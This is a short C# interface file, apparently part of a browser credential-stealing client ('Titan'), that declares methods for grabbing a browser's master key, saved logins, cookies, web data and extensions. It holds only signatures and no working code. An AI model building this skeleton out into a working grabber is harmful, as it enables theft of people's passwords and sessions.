using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Titan.NF.Client.Browsers.Contracts
{
    public interface IBrowserGrabber
    {
        void For(string sub);
        string Tag();
        string ProcessName();
        Dictionary<string, string> Extensions();
        byte[] MasterKey();
        byte[] LoginDatas();
        byte[] Cookie();
        byte[] WebData();
        bool Detected();
    }
}
